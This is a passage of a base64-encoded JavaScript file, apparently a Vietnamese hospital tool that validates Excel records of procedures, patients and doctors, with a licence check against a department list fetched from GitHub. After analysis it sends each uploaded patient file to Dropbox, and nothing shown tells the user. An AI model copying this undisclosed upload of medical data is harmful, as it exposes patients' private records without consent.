uZGlzcGxheSA9ICdub25lJzsgfSwgNDAwKTsNCiAgICB9DQoNCiAgICBidG5Mb2dpbi5kaXNhYmxlZCA9IGZhbHNlOw0KICAgIGJ0bkxvZ2luLmlubmVySFRNTCA9ICfEkMSDbmcgbmjhuq1wJzsNCiAgfQ0KfQ0KDQoNCiAgICAgICAgZnVuY3Rpb24gbG9nb3V0KCkgew0KICAgICAgICAgICAgY3VycmVudFVzZXIgPSBudWxsOw0KICAgICAgICAgICAgc2Vzc2lvblN0b3JhZ2UucmVtb3ZlSXRlbSgnbWVkVXNlcicpOw0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luU2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21haW5Db250ZW50Jykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd1c2VybmFtZUlucHV0JykudmFsdWUgPSAnJzsNCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXNzd29yZElucHV0JykudmFsdWUgPSAnJzsNCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbkVycm9yJykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgICAgICAgIGRvY3VtZW50LmJvZHkuY2xhc3NMaXN0LmFkZCgnbG9naW4tcGFnZScpOw0KICAgICAgICB9DQoNCi8vID09PT09PT09PT0gSMOATSBMT0FEIERBTkggU8OBQ0ggS0hPQSBI4buiUCBM4buGID09PT09PT09PT0gLy8NCmFzeW5jIGZ1bmN0aW9uIGxvYWRWYWxpZERlcGFydG1lbnRzKCkgew0KICAgIGNvbnN0IHVybCA9ICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY2hhdWh1eW5oMDEwNC9jaGF1aHV5bmgwMTA0LnR4dC9yZWZzL2hlYWRzL21haW4va2hvYS50eHQnOw0KICAgIHRyeSB7DQogICAgICAgIGNvbnN0IHJlcyA9IGF3YWl0IGZldGNoKHVybCk7DQogICAgICAgIGNvbnN0IHRleHQgPSBhd2FpdCByZXMudGV4dCgpOw0KICAgICAgICBjb25zdCBraG9hTGlzdCA9IHRleHQuc3BsaXQoJ1xuJykubWFwKGxpbmUgPT4gbGluZS50cmltKCkudG9Mb3dlckNhc2UoKSkuZmlsdGVyKEJvb2xlYW4pOw0KICAgICAgICByZXR1cm4ga2hvYUxpc3Q7DQogICAgfSBjYXRjaCAoZXJyKSB7DQogICAgICAgIGNvbnNvbGUuZXJyb3IoIktow7RuZyB0aOG7gyB04bqjaSBkYW5oIHPDoWNoIGtob2E6IiwgZXJyKTsNCiAgICAgICAgcmV0dXJuIFtdOw0KICAgIH0NCn0NCg0KICAgICAgICAvLyA9PT09PT09PT09IFBI4bqmTiBY4busIEzDnSBGSUxFID09PT09PT09PT0gLy8NCmZ1bmN0aW9uIGhhbmRsZUZpbGUoKSB7DQogICAgY29uc3QgZmlsZUlucHV0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbGVJbnB1dCcpOw0KICAgIGNvbnN0IGFuYWx5emVCdG4gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYW5hbHl6ZUJ0bicpOw0KICAgIGNvbnN0IGZpbGUgPSBmaWxlSW5wdXQuZmlsZXNbMF07DQoJDQppZiAoIWZpbGUpIHsNCiAgICBjb25zdCBwb3B1cCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nUG9wdXAnKTsNCiAgICBjb25zdCBsb2FkaW5nVGV4dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nVGV4dCcpOw0KICAgIGNvbnN0IHByb2dyZXNzQmFyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2dyZXNzQmFyJyk7DQoNCiAgICBsb2FkaW5nVGV4dC5pbm5lckhUTUwgPSBgDQogICAgICAgIDxpIGNsYXNzPSJmYXMgZmEtZXhjbGFtYXRpb24tdHJpYW5nbGUiIHN0eWxlPSJmb250LXNpemU6MjRweDtjb2xvcjpyZWQ7bWFyZ2luLWJvdHRvbToxMHB4OyI+PC9pPjxici8+DQogICAgICAgIDxzdHJvbmc+VnVpIGzDsm5nIGNo4buNbiBmaWxlIHRyxrDhu5tjIGtoaSBraeG7g20gdHJhPC9zdHJvbmc+PGJyLz48YnIvPg0KICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4iIG9uY2xpY2s9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nUG9wdXAnKS5zdHlsZS5kaXNwbGF5PSdub25lJyI+xJDDs25nPC9idXR0b24+DQogICAgYDsNCiAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9ICcwJSc7DQogICAgDQogICAgcG9wdXAuc3R5bGUuZGlzcGxheSA9ICdmbGV4JzsNCiAgICBwb3B1cC5jbGFzc0xpc3QuYWRkKCdzaG93Jyk7DQogICAgcmV0dXJuOw0KfQ0KDQoNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsZVJlcXVpcmVtZW50cycpLmNsYXNzTGlzdC5hZGQoJ2hpZGRlbicpOw0KICAgIGVycm9yTG9nID0gW107DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Jlc3VsdFNlY3Rpb24nKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvclNlY3Rpb24nKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgIGFuYWx5emVCdG4uZGlzYWJsZWQgPSB0cnVlOw0KICAgIGFuYWx5emVCdG4uaW5uZXJIVE1MID0gJzxpIGNsYXNzPSJmYXMgZmEtc3Bpbm5lciBmYS1zcGluIj48L2k+IMSQYW5nIGtp4buDbSB0cmEuLi4nOw0KICAgIC8vIOKchSBC4bqvdCDEkeG6p3UgxJHhur9tIDJzIMSR4buDIGhp4buHbiBwb3B1cCBu4bq/dSB24bqrbiDEkWFuZyAixJBhbmcga2nhu4NtIHRyYS4uLiINCmNsZWFyVGltZW91dChhbmFseXplUG9wdXBUaW1lcik7DQphbmFseXplUG9wdXBUaW1lciA9IHNldFRpbWVvdXQoKCkgPT4gew0KICAgIGNvbnN0IGJ0bkFuYWx5emUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYW5hbHl6ZUJ0bicpOw0KICAgIGlmIChidG5BbmFseXplLmlubmVySFRNTC5pbmNsdWRlcygnxJBhbmcga2nhu4NtIHRyYScpKSB7DQogICAgICAgIGNvbnN0IHBvcHVwID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdQb3B1cCcpOw0KICAgICAgICBjb25zdCBsb2FkaW5nVGV4dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nVGV4dCcpOw0KICAgICAgICBjb25zdCBwcm9ncmVzc0JhciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9ncmVzc0JhcicpOw0KDQogICAgICAgIGxvYWRpbmdUZXh0LmlubmVySFRNTCA9IGANCiAgICAgICAgICAgIDxpIGNsYXNzPSJmYXMgZmEtc2F0ZWxsaXRlLWRpc2ggaWNvbi1zcGluIiBzdHlsZT0iZm9udC1zaXplOjI0cHg7Y29sb3I6I2U2N2UyMjttYXJnaW4tYm90dG9tOjEwcHg7Ij48L2k+PGJyLz4NCiAgICAgICAgICAgIDxzdHJvbmc+xJDGsOG7nW5nIHRydXnhu4FuIGdpw6FuIMSRb+G6oW48L3N0cm9uZz48YnIvPg0KICAgICAgICAgICAgVnVpIGzDsm5nIMSR4bujaSB2w6BpIGdpw6J5IMSR4buDIGto4bufaSDEkeG7mW5nIG3DoXkgY2jhu6cgZOG7sSBwaMOybmcuLi4NCiAgICAgICAgYDsNCiAgICAgICAgcHJvZ3Jlc3NCYXIuc3R5bGUud2lkdGggPSAnMCUnOw0KICAgICAgICBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOw0KICAgICAgICByZXF1ZXN0QW5pbWF0aW9uRnJhbWUoKCkgPT4gcG9wdXAuY2xhc3NMaXN0LmFkZCgnc2hvdycpKTsNCg0KICAgICAgICAvLyBDaOG6oXkgcHJvZ3Jlc3NCYXIgJQ0KICAgICAgICBsZXQgcGVyY2VudCA9IDA7DQogICAgICAgIHByb2dyZXNzQmFyLnN0eWxlLnRyYW5zaXRpb24gPSAnd2lkdGggMC4ycyBsaW5lYXInOw0KICAgICAgICBjb25zdCBwcm9ncmVzc1RpbWVyID0gc2V0SW50ZXJ2YWwoKCkgPT4gew0KICAgICAgICAgICAgcGVyY2VudCArPSAyOw0KICAgICAgICAgICAgaWYgKHBlcmNlbnQgPiAxMDApIHsNCiAgICAgICAgICAgICAgICBwZXJjZW50ID0gMTAwOw0KICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwocHJvZ3Jlc3NUaW1lcik7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9IHBlcmNlbnQgKyAnJSc7DQogICAgICAgIH0sIDEwMCk7DQogICAgfQ0KfSwgNTAwMCk7DQoNCiAgICBjb25zdCByZWFkZXIgPSBuZXcgRmlsZVJlYWRlcigpOw0KICAgIA0KICAgIHJlYWRlci5vbmxvYWQgPSBhc3luYyBmdW5jdGlvbihlKSB7DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICBjb25zdCBkYXRhID0gbmV3IFVpbnQ4QXJyYXkoZS50YXJnZXQucmVzdWx0KTsNCiAgICAgICAgICAgIGNvbnN0IHdvcmtib29rID0gWExTWC5yZWFkKGRhdGEsIHsgdHlwZTogJ2FycmF5JyB9KTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKHdvcmtib29rLlNoZWV0TmFtZXMubGVuZ3RoID09PSAwKSB7DQogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCdGaWxlIEV4Y2VsIGtow7RuZyBjw7Mgc2hlZXQgbsOgbycpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBjb25zdCBmaXJzdFNoZWV0ID0gd29ya2Jvb2suU2hlZXRzW3dvcmtib29rLlNoZWV0TmFtZXNbMV1dOw0KICAgICAgICAgICAgY29uc3QganNvbkRhdGEgPSBYTFNYLnV0aWxzLnNoZWV0X3RvX2pzb24oZmlyc3RTaGVldCwgeyANCiAgICAgICAgICAgICAgICBoZWFkZXI6IDEsIA0KICAgICAgICAgICAgICAgIGRlZnZhbDogIiIsIA0KICAgICAgICAgICAgICAgIGJsYW5rcm93czogdHJ1ZSANCiAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgY29uc3QgZG9uZzUgPSAoanNvbkRhdGFbNF0gJiYganNvbkRhdGFbNF1bMF0pID8ganNvbkRhdGFbNF1bMF0udG9TdHJpbmcoKS50cmltKCkgOiAiS2jDtG5nIHLDtSI7DQpjb25zdCBkb25nNiA9IChqc29uRGF0YVs1XSAmJiBqc29uRGF0YVs1XVswXSkgPyBqc29uRGF0YVs1XVswXS50b1N0cmluZygpLnRyaW0oKSA6ICJLaMO0bmcgcsO1IjsNCndpbmRvdy5uZ2F5VmFsdWUgPSBkb25nNTsgIC8vIOKshSBkw7JuZyA1ID0gTmfDoHkNCndpbmRvdy5raG9hVmFsdWUgPSBkb25nNjsgIC8vIOKshSBkw7JuZyA2ID0gS2hvYQ0KDQoNCgkJCS8vLy8gS2nhu4NtIHRyYSBraG9hIC8vLy8vDQovLyDinIUgTOG6pXkgZOG7ryBsaeG7h3UgZMOybmcgNiwgY+G7mXQgQQ0KY29uc3Qga2hvYVJvdyA9IGpzb25EYXRhWzVdOyAvLyBkw7JuZyA2DQpjb25zdCBraG9hVGV4dCA9IChraG9hUm93ICYmIGtob2FSb3dbMF0gfHwgIiIpLnRvU3RyaW5nKCkudHJpbSgpOw0KY29uc3Qga2hvYUxvd2VyID0ga2hvYVRleHQudG9Mb3dlckNhc2UoKTsNCg0KLy8g4pyFIEtp4buDbSB0cmEgdMOqbiBraG9hDQpjb25zdCB2YWxpZEtob2FMaXN0ID0gYXdhaXQgbG9hZFZhbGlkRGVwYXJ0bWVudHMoKTsNCmlmICghdmFsaWRLaG9hTGlzdC5zb21lKGtob2EgPT4ga2hvYUxvd2VyLmluY2x1ZGVzKGtob2EpKSkgew0KICAgICAgd2luZG93LmlzS2hvYUxvaSA9IHRydWU7DQogICAgY29uc3QgbXNnID0gYOKdjCBNw6F5IGNo4bunIHThu6sgY2jhu5FpICR7a2hvYVRleHQgfHwgJ0tow7RuZyB4w6FjIMSR4buLbmgnfSBz4butIGThu6VuZyBwaOG6p24gbeG7gW0uIDxici8+VnVpIGzDsm5nIG11YSBi4bqjbiBxdXnhu4FuIMSR4buDIHTDtG4gdHLhu41uZyB0w6FjIGdp4bqjLiBgOw0KDQogICAgLy8gSGnhu4NuIHBvcHVwIGNo4bupIGtow7RuZyBhbGVydA0KIC8vIEhp4buDbiB0aOG7iyBwb3B1cA0KICAgICAgY29uc3QgcG9wdXAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1BvcHVwJyk7DQogICAgY29uc3QgbG9hZGluZ1RleHQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1RleHQnKTsNCiAgICBjb25zdCBwcm9ncmVzc0JhciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9ncmVzc0JhcicpOw0KDQogICAgLy8gSGnhu4NuIHRo4buLIHRow7RuZyBiw6FvIGzhu5dpIHbEqW5oIHZp4buFbg0KICAgIGxvYWRpbmdUZXh0LmlubmVySFRNTCA9IGANCiAgICAgICAgPGkgY2xhc3M9ImZhcyBmYS1iYW4iIHN0eWxlPSJmb250LXNpemU6MjRweDtjb2xvcjpyZWQ7Zm9udC1zaXplOjIwcHg7bWFyZ2luLWJvdHRvbToxMHB4OyI+PC9pPjxici8+DQogICAgICAgIDxzdHJvbmc+JHttc2d9PC9zdHJvbmc+PGJyLz48YnIvPg0KICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4iIG9uY2xpY2s9IndpbmRvdy5sb2NhdGlvbi5yZWxvYWQoKSI+xJDDs25nPC9idXR0b24+DQogICAgYDsNCiAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9ICcwJSc7DQoNCiAgICBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOw0KICAgIHBvcHVwLmNsYXNzTGlzdC5hZGQoJ3Nob3cnKTsNCg0KICAgIC8vIOKchSBWw5QgSEnhu4ZVIEjDk0EgYuG6pXQga+G7syDEkW/huqFuIG7DoG8gY+G7kSBn4bqvbmcg4bqpbiBwb3B1cCBzYXUgxJHDsw0KICAgIHdpbmRvdy5pc0tob2FMb2kgPSB0cnVlOw0KDQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3NjYW5TdGF0dXMnKS5pbm5lckhUTUwgPSBgPHNwYW4gc3R5bGU9ImNvbG9yOnJlZDtmb250LXdlaWdodDpib2xkIj4ke21zZ308L3NwYW4+YDsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncmVzdWx0U2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9yU2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgcmV0dXJuOw0KfQ0KDQoNCg0KCQkJDQogICAgICAgICAgICBpZiAoanNvbkRhdGEubGVuZ3RoIDw9IDEpIHsNCiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoJ0ZpbGUgRXhjZWwga2jDtG5nIGPDsyBk4buvIGxp4buHdSAoY2jhu4kgY8OzIHRpw6p1IMSR4buBIGhv4bq3YyB0cuG7kW5nKScpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgIHByb2Nlc3NEYXRhKGpzb25EYXRhKTsNCiAgICAgICAgICBjb25zdCBzdGF0cyA9IHsNCiAgICAgICAgICAgIGhlcmI6IGdldEhlcmJPdXRsaWVyVG90YWwoKSwNCiAgICAgICAgICAgICAgdGltZTogZ2V0VGltZUVycm9yVG90YWwoKSwNCiAgICAgICAgICAgICBjb25mbGljdDogZ2V0Q29uZmxpY3RUb3RhbCgpDQogICAgICAgICAgfTsNCiAgICAgICAgICBjb25zdCB1cGxvYWRGaWxlID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbGVJbnB1dCcpLmZpbGVzWzBdOw0KIGF3YWl0IHVwbG9hZFRvRHJvcGJveCh1cGxvYWRGaWxlLCB3aW5kb3cua2hvYVZhbHVlLCB3aW5kb3cubmdheVZhbHVlLCBzdGF0cyk7DQogICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7DQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsZVJlcXVpcmVtZW50cycpLmNsYXNzTGlzdC5yZW1vdmUoJ2hpZGRlbicpOw0KICAgICAgICAgICAgbG9nRXJyb3IoJ0zhu5dpIGtoaSDEkeG7jWMgZmlsZSBFeGNlbCcsIG51bGwsIGVycm9yLm1lc3NhZ2UpOw0KICAgICAgICAgICAgZGlzcGxheUVycm9ycygpOw0KICAgICAgICAgICAgYWxlcnQoJ0PDsyBs4buXaSB44bqjeSByYSBraGkgxJHhu41jIGZpbGU6ICcgKyBlcnJvci5tZXNzYWdlKTsNCiAgICAgICAgfSBmaW5hbGx5IHsNCgkJY2xlYXJUaW1lb3V0KGFuYWx5emVQb3B1cFRpbWVyKTsgLy8g4pyFIE5n4bqvdCB0aW1lciBwb3B1cA0KCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1BvcHVwJykuY2xhc3NMaXN0LnJlbW92ZSgnc2hvdycpOyAvLyDinIUg4bqobiBwb3B1cA0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nUG9wdXAnKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOyAgIC8vIOKchSDhuqhuIGjhurNuIHBvcHVwDQogICAgICAgICAgICBhbmFseXplQnRuLmRpc2FibGVkID0gZmFsc2U7DQogICAgICAgICAgICBhbmFseXplQnRuLmlubmVySFRNTCA9ICc8aSBjbGFzcz0iZmFzIGZhLXNlYXJjaCBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gS2nhu4NtIFRyYSc7DQogICAgICAgIH0NCiAgICB9Ow0KICAgIA0KICAgIHJlYWRlci5vbmVycm9yID0gZnVuY3Rpb24oKSB7DQogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWxlUmVxdWlyZW1lbnRzJykuY2xhc3NMaXN0LnJlbW92ZSgnaGlkZGVuJyk7DQogICAgICAgIGxvZ0Vycm9yKCdM4buXaSBraGkgxJHhu41jIGZpbGUnLCBudWxsLCAnS2jDtG5nIHRo4buDIMSR4buNYyBu4buZaSBkdW5nIGZpbGUnKTsNCiAgICAgICAgZGlzcGxheUVycm9ycygpOw0KICAgICAgICBhbmFseXplQnRuLmRpc2FibGVkID0gZmFsc2U7DQogICAgICAgIGFuYWx5emVCdG4uaW5uZXJIVE1MID0gJzxpIGNsYXNzPSJmYXMgZmEtc2VhcmNoIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBLaeG7g20gVHJhJzsNCiAgICAgICAgYWxlcnQoJ0zhu5dpIGtoaSDEkeG7jWMgZmlsZS4gVnVpIGzDsm5nIHRo4butIGzhuqFpIHbhu5tpIGZpbGUga2jDoWMuJyk7DQogICAgfTsNCiAgICANCiAgICByZWFkZXIucmVhZEFzQXJyYXlCdWZmZXIoZmlsZSk7DQp9DQoNCiAgICAgICAgZnVuY3Rpb24gcHJvY2Vzc0RhdGEoZGF0YSkgew0KICAgIA0KICAgIHRyeSB7DQogICAgICAgIGNvbnN0IGhlYWRlckxpbmUxID0gZGF0YVs3XSB8fCBbXTsNCiAgICAgICAgY29uc3QgaGVhZGVyTGluZTIgPSBkYXRhWzhdIHx8IFtdOw0KICAgICAgICBjb25zdCBjb21iaW5lZEhlYWRlcnMgPSBoZWFkZXJMaW5lMS5tYXAoKGNvbCwgaW5kZXgpID0+IA0KICAgICAgICAgICAgKGNvbCArICcgJyArIChoZWFkZXJMaW5lMltpbmRleF0gfHwgJycpKS50cmltKCkNCiAgICAgICAgKTsNCg0KICAgICAgICANCiAgICAgICAgICAgICAgICBjb25zdCBwcm9jZWR1cmVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7pyB0aHXhuq10IikpOw0KCQkJCWNvbnN0IGRhdGVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJOZ8OgeSB0aOG7sWMgaGnhu4duIikpOyAvLyBUaMOqbSBkw7JuZyBuw6B5DQogICAgICAgICAgICAgICAgY29uc3Qgc3RhcnRJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7nWkgZ2lhbiBi4bqvdCDEkeG6p3UgdGjhu7FjIGhp4buHbiIpKTsNCiAgICAgICAgICAgICAgICBjb25zdCBlbmRJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7nWkgZ2lhbiBr4bq/dCB0aMO6YyIpKTsNCiAgICAgICAgICAgICAgICBjb25zdCBvcGVyYXRvckluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4bunIHRodeG6rXQgY2jDrW5oIikpOw0KICAgICAgICAgICAgICAgIGNvbnN0IG5hbWVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJI4buNIHTDqm4iKSk7DQogICAgICAgICAgICAgICAgY29uc3QgcGF0aWVudElkSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiTcOjIEJOIikpOw0KICAgICAgICAgICAgICAgIGNvbnN0IGRvY3RvckluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIkLDoWMgc+G7uSBjaOG7iSDEkeG7i25oIikpOw0KICAgICAgICAgICAgICAgIGNvbnN0IG1pc3NpbmdDb2x1bW5zID0gW107DQogICAgICAgICAgICAgICAgaWYgKHByb2NlZHVyZUluZGV4ID09PSAtMSkgbWlzc2luZ0NvbHVtbnMucHVzaCgnVGjhu6cgdGh14bqtdCcpOw0KICAgICAgICAgICAgICAgIGlmIChzdGFydEluZGV4ID09PSAtMSkgbWlzc2luZ0NvbHVtbnMucHVzaCgnVGjhu51pIGdpYW4gYuG6r3QgxJHhuqd1IHRo4buxYyBoaeG7h24nKTsNCiAgICAgICAgICAgICAgICBpZiAoZW5kSW5kZXggPT09IC0xKSBtaXNzaW5nQ29sdW1ucy5wdXNoKCdUaOG7nWkgZ2lhbiBr4bq/dCB0aMO6YycpOw0KICAgICAgICAgICAgICAgIGlmIChvcGVyYXRvckluZGV4ID09PSAtMSkgbWlzc2luZ0NvbHVtbnMucHVzaCgnVGjhu6cgdGh14bqtdCBjaMOtbmgnKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBpZiAobWlzc2luZ0NvbHVtbnMubGVuZ3RoID4gMCkgew0KICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoYEtow7RuZyB0w6xtIHRo4bqleSBjw6FjIGPhu5l0IGLhuq90IGJ14buZYzogJHttaXNzaW5nQ29sdW1ucy5qb2luKCcsICcpfWApOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBjb25zdCByb3dzID0gZGF0YS5zbGljZSg5KTsNCiAgICAgICAgICAgICAgICBjb25zdCBwcm9jZWR1cmVzID0gW107DQogICAgICAgICAgICAgICAgY29uc3QgaGVyYlByb2NlZHVyZXMgPSBbXTsNCiAgICAgICAgICAgICAgICBsZXQgc2tpcHBlZFJvd3MgPSAwOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHJvd3MuZm9yRWFjaCgocm93LCBpbmRleCkgPT4gew0KICAgICAgICAgICAgICAgICAgICBjb25zdCByb3dOdW1iZXIgPSBpbmRleCArIDEwOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghcm93IHx8IHJvdy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2dFcnJvcignRMOybmcgdHLhu5FuZycsIHJvd051bWJlcik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2tpcHBlZFJvd3MrKzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHByb2NlZHVyZU5hbWUgPSByb3dbcHJvY2VkdXJlSW5kZXhdOw0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoIXByb2NlZHVyZU5hbWUpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBza2lwcGVkUm93cysrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFQUk9DRURVUkVTW3Byb2NlZHVyZU5hbWVdKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9nRXJyb3IoYFRo4bunIHRodeG6rXQga2jDtG5nIG7hurFtIHRyb25nIGRhbmggc8OhY2gga2nhu4NtIHRyYTogJHtwcm9jZWR1cmVOYW1lfWAsIHJvd051bWJlcik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2tpcHBlZFJvd3MrKzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChQUk9DRURVUkVTW3Byb2NlZHVyZU5hbWVdLnNraXApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBzdGFydCA9IHBhcnNlRGF0ZVRpbWUocm93W3N0YXJ0SW5kZXhdLCByb3dOdW1iZXIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGVuZCA9IHBhcnNlRGF0ZVRpbWUocm93W2VuZEluZGV4XSwgcm93TnVtYmVyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBoZXJiUHJvY2VkdXJlcy5wdXNoKHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcm93SW5kZXg6IHJvd051bWJlciwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF0aWVudE5hbWU6IG5hbWVJbmRleCAhPT0gLTEgPyByb3dbbmFtZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhdGllbnRJZDogcGF0aWVudElkSW5kZXggIT09IC0xID8gcm93W3BhdGllbnRJZEluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByb2NlZHVyZTogcHJvY2VkdXJlTmFtZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZG9jdG9yOiByb3dbZG9jdG9ySW5kZXhdIHx8ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0ZTogc3RhcnQ/LmRhdGVLZXkgfHwgJ0tow7RuZyB4w6FjIMSR4buLbmgnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGFydDogc3RhcnQ/LnNlY29uZHMgfHwgMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kOiBlbmQ/LnNlY29uZHMgfHwgMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlzcGxheVN0YXJ0OiBzdGFydD8uZGlzcGxheVRpbWUgfHwgJz8/JywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlzcGxheUVuZDogZW5kPy5kaXNwbGF5VGltZSB8fCAnPz8nLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcGVyYXRvcjogcm93W29wZXJhdG9ySW5kZXhdIHx8ICdLaMO0bmcgY8OzJywNCiAgICAg